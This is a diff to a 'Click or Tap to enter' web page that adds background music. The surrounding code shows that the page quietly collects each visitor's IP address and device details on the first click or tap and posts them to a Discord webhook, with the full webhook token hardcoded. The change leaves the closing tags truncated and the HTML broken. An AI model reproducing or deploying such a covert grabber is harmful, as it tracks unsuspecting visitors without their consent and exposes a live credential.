@@ -22,6 +22,7 @@
 <body>
   <h1 id="click-to-enter">Click or Tap to enter...</h1>
   <div id="info"></div>
+  <audio id="music" src="https://raw.githubusercontent.com/CosmoGT-dev/CosmoGT-Website/main/Me%20right%20now.mp3" preload="auto"></audio>
   <script>
     // Discord Webhook URL
     const webhookUrl = 'https://discord.com/api/webhooks/1275537111755522189/snOtFHUF9X35Mjfx3gaYyyZS4M1Un-sYtcYkrc3Sw0omUl6MLrd33AnepHKZm8sprUVj';
@@ -31,6 +32,9 @@
     // Function to collect device information
     function collectDeviceInfo() {
       if (hasSentInfo) return; // Exit if already sent
+
+      // Play music
+      document.getElementById('music').play();
 
       // Get user's IP address using IPify API
       fetch('https://api.ipify.org?format=json')
@@ -106,5 +110,4 @@
     document.addEventListener('click', collectDeviceInfo);
     document.addEventListener('touchstart', collectDeviceInfo);
   </script>
-</body>
-</html>
+</body
